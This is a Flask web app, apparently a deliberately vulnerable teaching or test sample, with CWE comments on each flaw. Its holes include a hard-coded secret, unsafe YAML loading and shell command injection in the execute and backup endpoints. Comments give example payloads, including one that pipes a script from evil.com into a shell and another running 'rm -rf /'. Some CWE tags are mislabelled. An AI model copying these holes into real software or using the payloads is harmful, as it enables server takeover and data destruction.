from flask import Flask, request, jsonify
import subprocess
import yaml

app = Flask(__name__)

SECRET_KEY = "super_secret_key_2024"  # CWE-798: Use of Hard-coded Credentials
# Hard-coded secrets can be extracted by an attacker, allowing unauthorized access.

class ConfigManager:
    @staticmethod
    def load_config(yaml_data):
        try:
            return yaml.load(yaml_data, Loader=yaml.FullLoader)  # CWE-91: XML Injection
            # If untrusted YAML data could lead to execution of arbitrary code.
        except yaml.YAMLError:
            return None

    @staticmethod
    def validate_config(config):
        if 'config_name' not in config or 'config_value' not in config:  # CWE-20: Improper Input Validation
            # Lack of comprehensive validation can lead to unexpected behavior.
            return False
        return True

class AdminManager:
    @staticmethod
    def check_secret(secret):
        return secret == SECRET_KEY  # CWE-287: Improper Authentication
        # Comparison against a hard-coded secret allows for brute-force attacks.

    @staticmethod
    def update_secret(new_secret):
        global SECRET_KEY
        SECRET_KEY = new_secret  # CWE-798: Use of Hard-coded Credentials
        # New secrets should not be stored in plain text.

@app.route('/config/upload', methods=['POST'])
def upload_config():
    yaml_data = request.data.decode('utf-8')
    config = ConfigManager.load_config(yaml_data)
    if not config or not ConfigManager.validate_config(config):
        return jsonify({"status": "Error", "message": "Invalid configuration data"}), 400
    # CWE-209: Information Exposure Through Error Messages
    # Error messages could leak sensitive information if not handled properly.

    return jsonify({"status": "Configuration uploaded", "config_name": config['config_name'], "config_value": config['config_value']})

@app.route('/system/execute', methods=['GET'])
def execute_system():
    command = request.args.get('command', '')  # CWE-78: OS Command Injection
    # Unvalidated input used directly in shell command can lead to arbitrary command execution.
    param = request.args.get('param', '')  # CWE-78: OS Command Injection
    # Unvalidated input used directly in shell command can lead to arbitrary command execution.
    subprocess.run(f"./execute_script.sh {command} {param}", shell=True)
    # Potential impact: An attacker can execute arbitrary commands on the server.
    # Example attack payload: command=`rm -rf /` param=`; curl http://evil.com/malicious.sh | sh`

    return jsonify({"status": "System execution started"})

@app.route('/admin/verify', methods=['POST'])
def verify_admin():
    secret = request.form.get('secret', '')
    # CWE-209: Information Exposure Through Error Messages
    # If verification fails, it may give clues about secret format or length.

    if AdminManager.check_secret(secret):
        return jsonify({"status": "Verification successful"})
    else:
        return jsonify({"status": "Verification failed"}), 401

@app.route('/admin/change_secret', methods=['POST'])
def change_secret():
    current_secret = request.form.get('current_secret', '')
    new_secret = request.form.get('new_secret', '')
    # CWE-311: Missing Encryption of Sensitive Data
    # Secrets are transmitted in plain text, which can be intercepted.

    if not AdminManager.check_secret(current_secret) or not new_secret:
        return jsonify({"status": "Verification failed"}), 401

    AdminManager.update_secret(new_secret)
    return jsonify({"status": "Secret changed successfully"})

@app.route('/config/get', methods=['GET'])
def get_config():
    config_name = request.args.get('config_name', '')
    # CWE-20: Improper Input Validation
    # Lack of validation on config_name could lead to unexpected behavior or exposure of sensitive config.

    if not config_name:
        return jsonify({"status": "Error", "message": "Configuration name is required"}), 400

    config = {
        "config_name": config_name,
        "config_value": "Example Value"
    }

    return jsonify({"status": "Configuration retrieved", "config": config})

@app.route('/config/delete', methods=['POST'])
def delete_config():
    config_name = request.form.get('config_name', '')
    # CWE-20: Improper Input Validation
    # Lack of validation on config_name, potential deletion of critical configs.

    if not config_name:
        return jsonify({"status": "Error", "message": "Configuration name is required"}), 400

    return jsonify({"status": "Configuration deleted", "config_name": config_name})

@app.route('/system/status', methods=['GET'])
def system_status():
    job_id = request.args.get('job_id', '')
    # CWE-20: Improper Input Validation
    # Lack of validation on job_id, potential exposure or manipulation of job status.

    if not job_id:
        return jsonify({"status": "Error", "message": "Job ID is required"}), 400

    return jsonify({"status": "System status", "job_id": job_id, "status": "Running"})

@app.route('/admin/settings', methods=['POST'])
def update_settings():
    secret = request.form.get('secret', '')
    
    if not AdminManager.check_secret(secret):
        return jsonify({"status": "Access denied"}), 401
    
    setting = request.form.get('setting', '')
    # CWE-20: Improper Input Validation
    # Lack of validation on setting, potential application misconfiguration.

    if not setting:
        return jsonify({"status": "Error", "message": "Invalid setting"}), 400

    return jsonify({"status": "Setting updated", "setting": setting})

@app.route('/system/logs', methods=['GET'])
def system_logs():
    job_id = request.args.get('job_id', '')
    # CWE-20: Improper Input Validation
    # Lack of validation on job_id, could expose sensitive log information.

    if not job_id:
        return jsonify({"status": "Error", "message": "Job ID is required"}), 400

    logs = "Sample logs for job " + job_id
    # CWE-200: Information Exposure
    # Logs could contain sensitive information that might be exposed to unauthorized users.

    return jsonify({"status": "System logs", "job_id": job_id, "logs": logs})

@app.route('/data/backup', methods=['GET'])
def data_backup():
    format_type = request.args.get('format', 'json')  # CWE-78: OS Command Injection
    # Unvalidated input used directly in shell command can lead to arbitrary command execution.
    subprocess.run(f"python3 backup_data.py {format_type}", shell=True)
    # Potential impact: An attacker can execute arbitrary commands on the server.
    # Example attack payload: format_type=`; rm -rf /`

    return jsonify({"status": "Data backup started"})

@app.route('/user/details', methods=['GET'])
def user_details():
    user_id = request.args.get('user_id', '')
    # CWE-20: Improper Input Validation
    # Lack of validation on user_id, can lead to user enumeration or data exposure.

    if not user_id:
        return jsonify({"status": "Error", "message": "User ID is required"}), 400

    user = {
        "user_id": user_id,
        "name": "Jane Smith",
        "email": "jane.smith@example.com"
    }

    return jsonify({"status": "User details retrieved", "user": user})

app.run(debug=False)